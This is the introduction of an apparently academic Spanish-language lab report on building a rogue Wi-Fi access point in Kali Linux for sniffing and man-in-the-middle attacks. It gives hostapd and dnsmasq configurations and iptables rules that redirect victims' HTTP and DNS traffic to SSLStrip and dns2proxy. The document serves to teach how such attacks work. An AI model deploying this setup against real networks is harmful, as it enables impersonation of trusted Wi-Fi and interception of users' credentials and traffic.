\section{Introducción}

\subsection{Objetivo}
El sniffing es la actividad por la cual se capturan, analizan y monitorean los paquetes que viajan por una red de computadoras. El MitM es un tipo de ataque
que nos permite no solo capturar los paquetes, sino también modicarlos o destruirlos antes de que lleguen a destino. En este trabajo práctico nos enfocaremos 
en montar un rogue AP, el cual nos permitirá hacernos pasar por una red confiable y luego poder sniffear o hacer MitM de los paquetes de los dispositivos 
conectados a la red.

\subsection{Herramientas que utilizamos}

Para poder montar el rogue AP, hacer sniffing y luego MitM, utilizamos la siguientes herramientas:

\begin{itemize}
	\item hostapd
	\item dnsmasq
	\item Wireshark
	\item tcpdump
	\item httpry
	\item sslstrip
	\item MITMf (sslstrip2 y dns2proxy)
	\item bettercap
\end{itemize}

\subsection{Configuración}
Para poder implementar el rogue AP y comenzar a sniffear tráfico decidimos trabajar sobre la distribución Kali linux en conjunto con 2 interfaces de red wireless. 
Una que nos proporcionará acceso a internet y la otra (como dongle USB) la utilizaremos para montar el rogue AP. 

La imagen de Kali linux la descargamos de la página de Offensive Security (https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/), 
la cual provee imagenes de Kali configuradas para funcionar en VirtualBox, VMWare, etc. . En nuestro caso utilizamos la imagen de VMWare. Para montar el rogue AP, 
utilizaremos la herramienta hostapd que nos permite levantar un AP rápidamente. Para lograrlo, realizamos los siguientes pasos:

\begin{enumerate}

	\item Instalamos hostapd y luego lo configuramos con la información del AP que queremos levantar
	
		\begin{lstlisting}[language=bash]
		
			$ sudo apt install hostapd

			---- /etc/hostapd/hostapd.conf ----
			interface=wlan0
			driver=nl80211
			ssid=RoqueAPWifi
			channel=6
			--------------------------------------------

		\end{lstlisting}
		
		
	\item Configuramos el rango de IP que va a utilizar nuestra interfaz que va funcionar como rogue AP (wlan0 en nuestro caso) con ifconfig
		
		\begin{lstlisting}[language=bash]
			$ ifconfig wlan0 10.0.0.1/24 up
		\end{lstlisting}
		
	\item Configuramos IP forwarding para que los paquetes de nuestra interfaz wlan0 (rogue AP) forwardee a la interfaz eth0 (la cual es la que provee conexion a internet).
		
		\begin{lstlisting}[language=bash]
			$ iptables -t nat -F
			$ iptables -F
			$ iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
			$ iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
			$ echo '1' > /proc/sys/net/ipv4/ip_forward
		\end{lstlisting}
		
	\item Instalamos y configuramos dnsmasq
		
		\begin{lstlisting}[language=bash]
			$ sudo apt install dnsmasq
			
			--- /etc/dnsmasq.conf ---
			log-facility=/var/log/dnsmasq.log
			interface=wlan0
			dhcp-range=10.0.0.10,10.0.0.250,12h
			dhcp-option=3,10.0.0.1
			dhcp-option=6,10.0.0.1
			log-queries
			---------------------------------
			
		\end{lstlisting}
		
	\item Finalmente, inicializamos los servicios hostapd y dnsmasq
		
		\begin{lstlisting}[language=bash]
			$ service dnsmasq start	
			$ service hostapd start
		\end{lstlisting}
	
\end{enumerate}
	
Para poder ejecutar todas estas configuraciones y levantar el ap rápidamente para hacer varias pruebas, generamos un script que realiza todos estos pasos 
llamado ap.sh. Luego de cargar todo esto en nuestra imagen, ejecutamos el script y logramos tener un AP funcionando al cual nos podemos conectar para poder
realizar nuestras pruebas de sniffing y MitM.

Luego, para hacer MitM, hicimos algunas modificaciones para poder utilizar otros servicios que nos permitan interceptar y modificar los paquetes. Estas modificaciones 
son para poder usar SSLStrip y dns2proxy y fueron incluidas también en el script ap.sh.

\begin{lstlisting}[language=bash]
	$ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
	$ iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53	
\end{lstlisting}
